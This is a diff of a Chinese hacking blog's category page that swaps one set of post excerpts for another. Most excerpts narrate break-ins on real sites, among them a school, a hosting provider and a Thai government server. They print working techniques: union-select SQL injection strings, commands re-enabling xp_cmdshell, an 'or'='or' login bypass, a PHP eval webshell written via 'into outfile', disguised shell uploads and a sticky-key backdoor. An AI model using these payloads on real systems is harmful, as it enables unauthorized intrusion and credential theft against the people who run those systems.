@@ -45,30 +45,29 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-06-12T09:46:14.000Z" itemprop="datePublished">
-          2012-06-12
+      <time datetime="2012-08-23T21:10:24.000Z" itemprop="datePublished">
+          2012-08-24
       </time>
     
     
     | 
-    <a href='/tag/内网渗透/'>内网渗透</a>,
+    <a href='/tag/注入/'>注入</a>,
     
-    <a href='/tag/渗透/'>渗透</a>
+    <a href='/tag/post/'>post</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/483.seo/">win内网渗透实例</a></h2>
+      <h2 class="post-title"><a href="/766.seo/">说说那些年躺在硬盘里的源码</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p>作者：赤龙<br>最近在整理资料时发现一些渗透笔记，于是翻开看看，原来有一个老外的内部网还没有拿下。当时已经给内网的一台机器种植了木马，反正闲着没事就拿它来练练手吧。打开远程居然肉鸡还在，废话就不多说了，下面开始吧。<br>首先来看看已经控制的这台电脑在内网中充当什么角色，并收集一些常规的信息。执行ipconfig /all (如图1)</p>
-<p><img style="display: inline; border: 0px;" title="clip_image001" src="http://img.cker.in/win_18C1/clip_image001.png" alt="clip_image001" width="752" height="754" border="0" /><br>从这里我们可以看出，此计算机名为abimaq6，ip地址是172.16.16.139。子网掩码为255.255.240.0、网关172.16.16.1、DNS服务器分别是172.16.16.2和172.16.16.3。还有一个重要的就是这台机器处于域管理模式中，所在域为abimaq.local。<br>既然是域结构，再来获取一下域用户列表，执行net user /domain命令(如图2)。该命令可显示所有的域用户名单。看来域用户还真多。</p>
+        <p>作品：说说那些年躺在硬盘里的.    <br />作者：adwin     <br />来自：法客论坛 – F4ckTeam     <br />网址：<a href="http://team.f4ck.net/">http://team.f4ck.net/</a></p>  <p>/<em>第一页内容纯扯皮，可虑过，想直接看实际内容的可跳至第二页</em>/    <br />从过年的时候就有个想法想要搞一个友情链接互换的这么一个平台，我个人觉得这个想法其    <br />实还是不错的，目前来说做这个的人真的是寥寥无几，百度一下，能找到的也就是那么几个    <br />站点。但是后来种种原因，一直到现在这个平台也没搭建起来。     <br />最近得知老嫖同志要搞活动，既然线下的活动没能在哈尔滨地区举办，没有机会参加了，    <br />那就参加个线上活动也不错，所以决定写篇文章，不过自从上了大学以后，有一年没怎么实    <br />际上手实践了（寝室的网速尼玛蛋碎啊），真心害怕写不出什么好的文章，所以…大伙就凑    <br />合着看吧…     <br />========以上背景=============     <br />说了寝室的网速有点难以让人相信，上个 QQ 还得经常掉线，写点什么好呢，好吧，刚好发    <br />现&#160; 那些年躺在硬盘里的…源码（不要想歪了…），过年的时候由于想要搞那个链接交换平台    <br />所以下载了几套源码。前面说过搞这个东西的人很少，所以这个源码也着实&#160; 不好找，费了    <br />好大的力气找了几套，质量也是参差不齐，选出了一套凑合着可以用的，其他的就都删了。    <br />蛋碎的网速根本不允许去检测什么网站了，所以就想到，不 如就拿这套源码下手吧。     <br />另，什么 asp php jsp 的，我是一样也不懂…本文分析的是一套 asp 的程序，因为不懂 asp 代    <br />码，所以文中若粗线各种错误的地方还请见谅并指出。     <br />随便打开一个文件看了看，果然，代码很乱，一看就像是实习生写的…竟然每个页面都相同    <br />的 head 部分都没有作为一个文件包含起来，总是代码是乱的不能再乱了…     <br />如何下手呢，当然是先运行起来了。我本机win7，本来想用自带的 iis7来着，结果不知道什    <br />么毛错误运行不起来（汗！），算了，找了一款 asp 调试工具，这样总算是有了运行的环境。    <br />首先打开首页如下图：     <br /><a href="http://img.cker.in/83c624f2318a_B8E7/image.png" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="image" border="0" alt="image" src="http://img.cker.in/83c624f2318a_B8E7/image_thumb.png" width="613" height="409" /></a> </p>  <p>（打码部分其实是某妹纸的电话…当时在看代码，电话没地方记顺便给写广告位上了…）    <br />随便打开了一个链接的详细内容页面，发现是动态链接（说了代码质量很低的，作者不可能 </p>  <p>去做生成静态或者伪静态的处理），一下面的 URL（由于本文的例子比&#160; 较特殊，所以下文   <br />中若出现 链接 一词，则表示链接交换平台中的数据，即包含 百度收录&#160; PR&#160; 快照日期 交    <br />换要求&#160; 发布时间&#160; 等详细内容，若测试注入漏洞等，则将其地址用&#160; URL&#160; 一词表示，而不是     <br />链接，请注意区分）为例：<a href="http://111.43.205.21/display.asp?id=23850（111.43.205.21为笔者当">http://111.43.205.21/display.asp?id=23850（111.43.205.21为笔者当</a></p>
       
       </p>
       
       <p>
-          <a href="/483.seo/" class="excerpt-link">Read More...</a>
+          <a href="/766.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -77,33 +76,29 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-06-12T09:37:14.000Z" itemprop="datePublished">
-          2012-06-12
+      <time datetime="2012-08-19T10:28:01.000Z" itemprop="datePublished">
+          2012-08-19
       </time>
     
     
     | 
-    <a href='/tag/入侵/'>入侵</a>,
+    <a href='/tag/渗透测试/'>渗透测试</a>,
     
-    <a href='/tag/大黑阔/'>大黑阔</a>,
-    
-    <a href='/tag/黑站/'>黑站</a>,
-    
-    <a href='/tag/日站/'>日站</a>
+    <a href='/tag/安全加固/'>安全加固</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/481.seo/">历时5个月拿下PR7网站思路</a></h2>
+      <h2 class="post-title"><a href="/762.seo/">对某高级技工学校网站的安全检测和加固</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p>历时5个月拿下PR7网站思路</p>  <p>作者：xxbing </p>  <p>在腾讯2009年安全技术峰会上我曾经提出一个观点：墨菲定律：如果它能够被黑阔攻破，它就将被攻破。对于一个黑阔来说，他要黑一个企业，仅仅是时间上的问题，总之是成本上的问题，比如有个盗号集团在支持他，他说我给你一年时间你把这个企业黑了，搞定了就给你多少钱。一年时间我相信只要他有这个毅力，基本上在座的公司逃不过这一劫。</p>  <p>这个观点看似有点哗众取宠，但它确实是一个不争的事实。XXB同学就上演了5个月日掉PR7网站的LIVE秀。</p>  <p>我总结下教训：</p>  <p>UDEV补丁没打，估计其他几个内核补丁肯定也没打</p>  <p><a name="tpc">2</a>、主机安全需要有基线，PHP安全模式得打开    <br />3、被安装了ssh后门却蒙在鼓里    <br />这三点看似简单，但却知难行易；建立完善的主机入侵防御体系，技术对抗很重要，但技术对抗只是一个小问题。引用caoz的一段话：    <br />1.技术是为了解决问题，而不是制造问题。    <br />2.把握目标去应用技术，而不是为了技术去虚构目标。（包子注：技术狂人一般喜欢这么做，为了追求自己的满足感，成就感，虚构目标，虚构需求）    <br />3.用户需求（通常是潜在需求）决定技术和产品方向，技术反过来刺激需求的显现和增长。    <br />4.技术仍然非常重要，非常有价值，但是前提是，它要用到正确的方向上。    <br />【文中网址都已和谐！该站点网址用<a href="http://www.xxbing.com/">ha.cker.in</a>代替】    <br />美女同学要看言情小说，<a href="http://www.xxbing.com/">ha.cker.in</a> 的言情小说要收钱，于是就帮她找找“空子”！    <br />在<a href="http://tool.chinaz.com/">http://tool.chinaz.com/</a>查了一下<a href="http://www.xxbing.com/">ha.cker.in</a>信息，日IP访问量快达到40W了。很牛逼呀。全站采用php构架。nignx服务器。好了，废话结束。进入正题。    <br />首先我注册了一个账号，然后我登陆作者平台，申请成为作者需要提交自己的原创作品。于是我上baidu搜索了一本很多年前的小说，提交了几章，等待审核。    <br />几天后，成功的申请成为作者。经过1-2个小时的手工测试，成功的在管理作品处寻到一个注射点。    <br />类似： book.php?bookid=123    <br />我提交 book.php?bookid=123 and 1=1 [正常]    <br />book.php?bookid=124-1 [正常]    <br />book.php?bookid=123 and 1=2 [错误]提示权限不足。    <br />book.php?bookid=124 [错误]提示权限不足。    <br />可以判断这里是注射点了，为什么会提示权限不足，应该是每个bookid代表一本图书，有其他字段控制着作者信息，防止非法编辑他人作品。    <br />用order判断出有53个字段。    <br />book.php?bookid=123 and 1=2 union select 1,2,3,……,52,53# 提示：[错误]提示权限不足。    <br />绝对是其中某个位置的数字不正确，导致系统判断我编辑了其他人的图书。于是我把注射点丢到pangolin里面暴力跑字段。成功的跑出53个字段名出来。（一个字符一个字符的暴力猜解。跑了很久）    <br />然后提交： book.php?bookid=123 and 1=2 union select 字段名1,字段名1,字段名3,……,字段名52,字段名53# 成功显示正常页面。    <br />接着我把字段名1、字段名2等等，一个个替换成数字，这个过程中一直显示正常页面。终于到了字段名13的时候，出错了，提示权限不足。那就可以跑了。    <br />book.php?bookid=123 and 1=2 union select 1,2,3,…,字段名13,…,52,53# 正常页面，页面上出现我定义的数字。    <br />接下来就丢到WSI 5.1里面跑数据。很可惜，数据库里面只有一些作品内容，也有编辑用户表，所有编辑账号密码都有，但是找不到后台。    <br />于是我开始寻找绝对路径，也找了N久，后来被我在上传图片处找到。上传一张图片，系统会自动生成该图片的缩略图，我上传一个文本图片，处理的时候出错了。爆出了绝对路径。    <br />[/opt/data/www/xxx.cn/common/include/upfile.php]    <br />用load_file能读出来。顺藤摸瓜，成功读到Mysql账号密码。    <br />mysql账号： Myuser    <br />密码： (Myuser.pass)</p>
+        <p>虽然今年金融危机给人们带来了“酷冬”，我国经济收到明显影响，到处都在传某某公司准备裁多少人！感觉这个冬天特别冷，在写这篇文章的时候，俺仍然感觉很冷，加入安天365这个团队，让俺感觉很温暖，在这个物欲横流，唯利是图的时候还有人对技术如此执著，对网络安全技术进行系统研究，那是何等的一种精神，我很欣赏团队中的一句话：技术需要沉淀，学习是一个渐进的过程，时间长了，即使是一块顽石，我也能把它滴穿！</p>  <p>今天发现的是一所技工学校，先对其进行安全检测，然后对其出现漏洞的地方进行了防范，下面将漏洞挖掘、分析和修补过程写出来跟大家分享。</p>  <p>（一）漏洞挖掘</p>  <p>1.获取初步信息</p>  <p>某天simeon在群里发了一个IP地址，让众兄弟们看看看看网站安全性如何，说是有奖励。（某人偷笑ing：有奖励好啊！俺就好这口）。首先打开网站看看网站能否访问，一看原来是个高级技工学校的网站，如图1所示，这几天搞学校的网站搞出毛病了，一看到学校网站就两眼放光，因为学校网站院系众多，而且网站更新比较缓慢，一套程序可能用上几百年也不一定换，所以漏洞自然也少不了，因此总的来说搞学校网站还是相对容易的。    <table border="1" cellspacing="0" cellpadding="0"><tbody>       <tr>         <td>           <p><a href="http://new.51cto.com/files/uploadimg/20081205/181807596.jpg"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/bfc5b233d1f9_12B8/clip_image002.jpg" width="518" height="455" /></a></p>         </td>       </tr>        <tr>         <td>           <p>图1 查看网站基本情况</p>         </td>       </tr>     </tbody></table> </p>  <p>说明：</p>  <p>由于发来的是一个IP地址，因此需要先看看该地址时候在默认80端口开放了Web服务，然后看看是使用什么语言，当然也可以直接将地址放入SQL注入扫描工具中进行SQL注入点检测。</p>  <p>2.查看端口开放情况</p>  <p>使用“sfind –p 222.134.217.206”命令查看该服务器端口开放情况，如图2所示，计算机开放了21、80以及4899端口，看到这里，嘿嘿，俺觉得该服务器的安全应该不是太高，可以拿到权限。</p>
       
       </p>
       
       <p>
-          <a href="/481.seo/" class="excerpt-link">Read More...</a>
+          <a href="/762.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -112,29 +107,29 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-06-12T09:35:13.000Z" itemprop="datePublished">
-          2012-06-12
+      <time datetime="2012-08-19T10:26:26.000Z" itemprop="datePublished">
+          2012-08-19
       </time>
     
     
     | 
-    <a href='/tag/渗透/'>渗透</a>,
+    <a href='/tag/提权/'>提权</a>,
     
     <a href='/tag/入侵/'>入侵</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/478.seo/">社工+渗透某IDC服务器</a></h2>
+      <h2 class="post-title"><a href="/759.seo/">记入侵提权时一次绕过3389证书验证</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p>作者：hu1s4</p>  <p>最近准备做个教育资源站，就打算在网上买个空间，ok百度下吧看看哪个好点</p>  <p>最后准备去这个站注册www.xxxxx.com</p>  <p>西部万维，西部IDC行业领跑，以最值得信赖的信誉为您提供服务器托管、服务器租用、域名注册、服务器租用、VPS、独立IP虚拟主机等服务</p>  <p>淘宝—网银—支付宝—支付成功！！</p>  <p>嘻嘻 邮箱收信了、</p>  <p>嘿嘿…空间到手了，进入FTP传个大马，因为我购买的是全能型空间，所以直接上传asp php asp.net jsp四类大马</p>  <p>查看，哎，权限bt啊，</p>  <p>（如果权限不bt，难道想被万人骑啊 hoho~~~）</p>  <p>试试看.net马吧</p>  <p>貌似权限比ASP的要大 可跳转</p>  <p>在C:\Program Files 发现了360还有星外的主机管理系统</p>  <p>一、提权之旅</p>  <p>在网上看了很多的星外提权文章，大概可以分为：</p>  <p>星外sa注册表位置在这里可以翻到sa的密码 不过需要破解</p>  <p>HKEY_LOCAL_MACHINE\SYSTEM\LIWEIWENSOFT\INSTALLFREEADMIN\11</p>  <p>C:\Documents and Settings\All Users\Application Data\Microsoft\Media Index\ 星外可写目录</p>  <p>还有一些就不列举了经过测试没有一个可行 ……峰回路转</p>  <p>正我郁闷的时候看到了Global.asa，激动的打开一看既然是sa用户</p>  <p>呵呵提权没问题了吧，不过却：</p>  <p>SQL Server 阻止了对组件 ‘xp_cmdshell’ 的过程’sys.xp_cmdshell’ 的访问</p>  <p>组件删除了，没关系我们恢复</p>  <p>dbcc addextendedproc (&quot;sp_oacreate&quot;,&quot;odsole70.dll&quot;)&#160; <br />dbcc addextendedproc (&quot;xp_cmdshell&quot;,&quot;xplog70.dll&quot;)</p>  <p>恢复好了，执行下命令在创建用户加入管理，，OK搞定</p>  <p>远程连接的时候悲剧了既然限制了管理用户组的权限。哎</p>  <p>继续想其他办法，在网上看了一篇文章</p>  <p>知道星外的ftp是自带的，我们可以通过IIS配置来读取用户密码</p>  <p>打开aspx的IIS间谍功能，既然没有禁止，教大家一个禁止aspx查看IIS配置的方法</p>  <p>找到C:\WINDOWS\system32\activeds.tlb这个文件，取消users权限即可，别人就不能查看你的IIS了</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/IDC_15DB/clip_image001.png" width="558" height="233" /></p>  <p>大家看到上面的比较了红色的FREE….</p>  <p>Freehostrunat这个用户是安装星外时建立的后面的密码并不是什么加密方式其实就是明文密码</p>  <p>我们可以直接远程登陆,在内网的话就转发</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/IDC_15DB/clip_image002.png" width="513" height="375" /></p>  <p>好了，成功拿下服务器…. 继续渗透….</p>
+        <p>一天，在源码站下载了一套《易天工作室通用企业型后台管理系统》源代码来读。check.asp页面中发现了一个问题，由于程序没有对输入内容进行过滤，我们可以输入万能密码登陆，直接进入后台。（难道这个就是传说的中企业后台漏洞？）</p>  <p>发现了这套程序的漏洞，那我们当然要利用此漏洞来拿服务器咯。Google hacking 了一下，来到了郑州大学某院系的页面。直接在URL后面加上admin，后台一下就跳出来了。让我们看看漏洞是否存在吧。在用户名和密码处都填’or’=’or’ ，然后把验证码写好，点登陆，果然进入了管理页面，说明漏洞真的存在哦。因为这套程序本身就有备份的功能，所以得到WEBSHELL就很简单了。</p>  <p>先把我们的ASP木马改成JPG格式上传，如图1在空间图片管理的最后1页或2页就可以看到我们的图片木马了。如图2然后右键，属性就可以得到上传的路径了。之后，在数据库备份里把我们的图片木马还原成ASP格式就可以了。（在备份的时候，如果路径填写错误会提示网页无法显示，如果出现这样的情况，可以检查下图片的路径是否填写正确。此套程序中也有ewebeditor，如果后台中备份的功能被删除了，可以试试用这个来拿webshell，因为很多管理员都忘记更改它的默认密码或数据库路径）。</p>
       
       </p>
       
       <p>
-          <a href="/478.seo/" class="excerpt-link">Read More...</a>
+          <a href="/759.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -143,27 +138,29 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-06-12T09:29:54.000Z" itemprop="datePublished">
-          2012-06-12
+      <time datetime="2012-08-15T20:05:16.000Z" itemprop="datePublished">
+          2012-08-16
       </time>
     
     
     | 
-    <a href='/tag/渗透/'>渗透</a>
+    <a href='/tag/提权/'>提权</a>,
+    
+    <a href='/tag/入侵/'>入侵</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/476.seo/">某官网的渗透笔记</a></h2>
+      <h2 class="post-title"><a href="/755.seo/">对mcc.net.cn的一次检测</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        某官网的渗透笔记，挖掘的某0DAY拿到webshell，USER权限，联通外网，提权SYSTEM的EXP无效，看来打的补丁很全，服务器用的是微软FTP,MSSQL，没啥突破口。路过其他盘，发现一个小有年份的BKF文件，貌似这个是用于系统的恢复和还原的.复制到WEB 目录下回来。装个虚拟机还原BKF文件。虚拟机就变成目标主机的系统了。没有密码登陆不进去了。插入WINPE光盘，替换sethc.exe ，做个shift后门，按5次shift进
+        <p>原文地址：法克论坛   <br />N久前的事情了 以前是独服的 现在旁站很多 检测原因:雅兰MJJ 在群里发的这个站，说没事大家去日它装逼。听说还是全国最大的MCC潮流社区。于是我就开始了邪恶之旅先踩点:网站是ASP的 IIS6.0 windows2003有个数据库雅兰下载来了不过得到的密</p>  <p>PS:N 久前的事情了 以前是独服的 现在旁站很多   <br /> 检测原因:雅兰MJJ 在群里发的这个站，说没事大家去日它装逼。听说还是全国最大的MCC潮流社区。    <br />于是我就开始了邪恶之旅    <br />先踩点:网站是ASP的 IIS6.0 windows2003    <br />有个数据库雅兰下载来了    <br />不过得到的密码是这个 +++++++++sadasc636++++    <br />哎 无果    <br />那就看旁站吧    <br /><a href="http://img.cker.in/mcc.net.cn_A915/clip_image001.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/mcc.net.cn_A915/clip_image001_thumb.jpg" width="806" height="554" /></a>    <br />有个论坛    <br />Bbs.mcc.net.cn    <br />论坛也是ASP的然后根据ICO 发现他是DVBBS 的程序    <br />版本未知</p>
       
       </p>
       
       <p>
-          <a href="/476.seo/" class="excerpt-link">Read More...</a>
+          <a href="/755.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -172,27 +169,44 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-06-12T09:27:34.000Z" itemprop="datePublished">
-          2012-06-12
+      <time datetime="2012-08-09T18:23:55.000Z" itemprop="datePublished">
+          2012-08-10
       </time>
     
     
     | 
-    <a href='/tag/内网渗透/'>内网渗透</a>
+    <a href='/tag/Wordpress/'>Wordpress</a>,
+    
+    <a href='/tag/入侵/'>入侵</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/473.seo/">渗透某大型内网入侵过程</a></h2>
+      <h2 class="post-title"><a href="/750.seo/">转国外 干掉一个wp站点</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        本文阐述：文章从网站入侵到内网渗透提权，作者给大家带来了一篇精彩的内网渗透文章。读后此文你能清晰的认识到内网入侵的细节技术。   由于平时比较忙，用了很久的VPN肉鸡飞掉了，近来正好有时间于是打开google搜索upfile.asp开始找肉鸡，来了台湾某XX站，，为了不必要的麻烦，我隐藏了敏感内容。直接到传asp提示错误，那么直接传了gif以后，查看上传路径发现自己重命名了，如果没有重命名的话在IIS6下百分之90以上可以拿shell了
+        <p>他站点（旁站：sameip.org）：</p>
+<p><a href="http://img.cker.in/wp_90E7/clip_image001.png" target="_blank"><img style="display: inline; border: 0px;" title="clip_image001" src="http://img.cker.in/wp_90E7/clip_image001_thumb.png" alt="clip_image001" width="541" height="296" border="0" /></a></p>
+<p><a href="http://sameip.org/">Same IP</a>   26 sites hosted on IP Address 173.236.138.113</p>
+<p style="text-align: justify;"><strong>IDDomainSite Link</strong>1</p>
+
+<p><pre>hijackthisforum.com<a href="http://www.hijackthisforum.com/">hijackthisforum.com</a>2sportforum.net<a href="http://www.sportforum.net/">sportforum.net</a>3freeonlinesudoku.net<a href="http://www.freeonlinesudoku.net/">freeonlinesudoku.net</a>4cosplayhell.com<a href="http://www.cosplayhell.com/">cosplayhell.com</a>5videogamenews.org<a href="http://www.videogamenews.org/">videogamenews.org</a>6gametour.com<a href="http://www.gametour.com/">gametour.com</a>7qualitypetsitting.net<a href="http://www.qualitypetsitting.net/">qualitypetsitting.net</a>8brendanichols.com<a href="http://www.brendanichols.com/">brendanichols.com</a>98ez.com<a href="http://www.8ez.com/">8ez.com</a>10hack-test.com<a href="http://www.hack-test.com/">hack-test.com</a>11kisax.com<a href="http://www.kisax.com/">kisax.com</a>12paisans.com<a href="http://www.paisans.com/">paisans.com</a>13mghz.com<a href="http://www.mghz.com/">mghz.com</a>14debateful.com<a href="http://www.debateful.com/">debateful.com</a>15jazzygoodtimes.com<a href="http://www.jazzygoodtimes.com/">jazzygoodtimes.com</a>16fruny.com<a href="http://www.fruny.com/">fruny.com</a>17vbum.com<a href="http://www.vbum.com/">vbum.com</a>18wuckie.com<a href="http://www.wuckie.com/">wuckie.com</a>19force5inc.com<a href="http://www.force5inc.com/">force5inc.com</a>20virushero.com<a href="http://www.virushero.com/">virushero.com</a>21twincitiesbusinesspeernetwork.com<a href="http://www.twincitiesbusinesspeernetwork.com/">twincitiesbusinesspeernetwork.com</a>22jennieko.com<a href="http://www.jennieko.com/">jennieko.com</a>23davereedy.com<a href="http://www.davereedy.com/">davereedy.com</a>24joygarrido.com<a href="http://www.joygarrido.com/">joygarrido.com</a>25prismapp.com<a href="http://www.prismapp.com/">prismapp.com</a>26utiligolf.com<a href="http://www.utiligolf.com/">utiligolf.com</a></pre><br>总计有26个站点在[173.236.138.113]这台服务器上。为了黑掉目标站点，许多黑客会把目标站点同服的其他站点也划入攻击范围内。但是出于学习的目的，我们今天暂且将其他站点放在一边。</p>
+<p>我们需要更多关于目标站点的信息（Ps：笔者认为在渗透测试过程中，这比实施测试的环节来得重要得多。），他们包括：</p>
+<p>1.DNS记录（A，NS，TXT，MX）</p>
+<p>2.WEB服务类型（IIS，APACHE，TOMCAT）</p>
+<p>3.域名注册者的信息（所持有域名公司等）</p>
+<p>4.目标站点管理员（相关人员）的姓名，电话，邮箱和住址等</p>
+<p>5.目标站点所支持的脚本类型（PHP，ASP，JSP，ASP.net，CFM）</p>
+<p>6.目标站点的操作系统（UNIX,LINUX,WINDOWS,SOLARIS）</p>
+<p>7.目标站点开放的端口</p>
+<p>让我们先来查询相关DNS记录吧，这里用的是 who.is：</p>
+<p><a href="http://img.cker.in/wp_90E7/clip_image002.png" target="_blank"><img style="display: inline; border: 0px;" title="clip_image002" src="http://img.cker.in/wp_90E7/clip_image002_thumb.png" alt="clip_image002" width="596" height="326" border="0" /></a></p>
       
       </p>
       
       <p>
-          <a href="/473.seo/" class="excerpt-link">Read More...</a>
+          <a href="/750.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -201,29 +215,29 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-06-12T09:17:58.000Z" itemprop="datePublished">
-          2012-06-12
+      <time datetime="2012-08-09T18:13:46.000Z" itemprop="datePublished">
+          2012-08-10
       </time>
     
     
     | 
     <a href='/tag/入侵/'>入侵</a>,
     
-    <a href='/tag/dis9/'>dis9</a>
+    <a href='/tag/idc/'>idc</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/470.seo/">入侵泰国政府网站</a></h2>
+      <h2 class="post-title"><a href="/747.seo/">对IDC的一次检测</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p>看了一个泰国政府的网站被伊朗的黑客挂页，上面写着   <br />“Your Box 0wn3z By Behrooz_Ice - Q7x -Sha2ow -Virangar -Ali_Eagle -iman_taktaz - Satanic2000”    <br />“We Love Iran”    <br />“Ashiyane Digital Security Team”    <br />这样的话云云。    <br />下面我就讲讲怎么捅了他们的PP(<a href="http://203.154.183.18/ash_hack.htm">http://203.154.183.18/ash_hack.htm</a>)    <br />网站服务器ip为：203.154.183.18上面一共有大约一百多个xx.cad.go.th(泰国<a href="http://gov.com.im/art_design/2012/0419/%E5%85%A5%E4%BE%B5%E6%B3%B0%E5%9B%BD%E6%94%BF%E5%BA%9C%E7%BD%91%E7%AB%99.html">政府</a>域名后缀)的网站    <br />包括主域名：<a href="http://www.cad.go.th/">www.cad.go.th</a>(<a href="http://www.cad.go.th/webadmin/">www.cad.go.th/webadmin/</a>)    <br />我先是看了看上面站的构架，基本上都是一个模板出来的，似乎有点脚本问题，不过不从这边下手。直接访问ip可以看到一个管理后台</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/24a24e5761a3_1231/clip_image001.png" width="474" height="238" /></p>
+        <p>群里兄弟抛来一个站点，说要弄C段的另一个站点。看看，该IDC站点有数据备份后台，弱口令进入。   <br /><a href="http://img.cker.in/IDC_8FAD/clip_image002.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/IDC_8FAD/clip_image002_thumb.jpg" width="620" height="452" /></a>    <br />一、拿个shell    <br />php站点，mysql数据库，可以sql备份、导入、导出、执行SQL，没有上传，root权限。    <br />但是找不到站点的绝对路径，群里兄弟就找找周围的站点，希望能得到某个站点的绝对路径，    <br />不久就爆出一个php的站点，准备mysql导出shell，但网站有注入检测系统，导入不成功，原因有：    <br />（1）路径不对；    <br />（2）root被降权，没有权限写；    <br />（3）被检测到恶意代码；    <br />前几天碰到过这种情况，改了</p>  <p>1. Select ‘&lt;?php @eval($_POST[cmd])?&gt;; ‘ into/**/outfile……../b.php’，OK</p>  <p>复制代码</p>  <p>连接成功。得到一个旁站的php shell。   <br />测试了结果：    <br />(1)执行命令不行；    <br />(2)只能在本站转；    <br />什么也干不了。    <br />二、再拿php、asp&#160; shell    <br />后来有人把mysql的root密码破了，登陆phpmyadmin，直接进行数据库操作。用mysql客户端登陆没有登陆上。    <br />上php大马，udf提权也失败了，原因不明。旁站的php shell权限很小，想到能利用的真不多。    <br />又有人得到一个asp旁站的shell，上去看了，除了数据库组件、fso、mai组件外，其他都不能用，难怪不能执行cmd。    <br />陆续又得到几个旁站的shell，都市php和asp的，能利用的少。</p>
       
       </p>
       
       <p>
-          <a href="/470.seo/" class="excerpt-link">Read More...</a>
+          <a href="/747.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -231,7 +245,7 @@
   
   <nav class="pagination" role="pagination">
     <a class="newer-posts" href="/category/渗透测试/page/9/">← Newer Posts</a>
-    <span class="page-number">Page 10 of 11</span>
+    <span class="page-number">Page 10 of 16</span>
     <a class="older-posts" href="/category/渗透测试/page/11/">Older Posts →</a>
   </nav>
 </main>
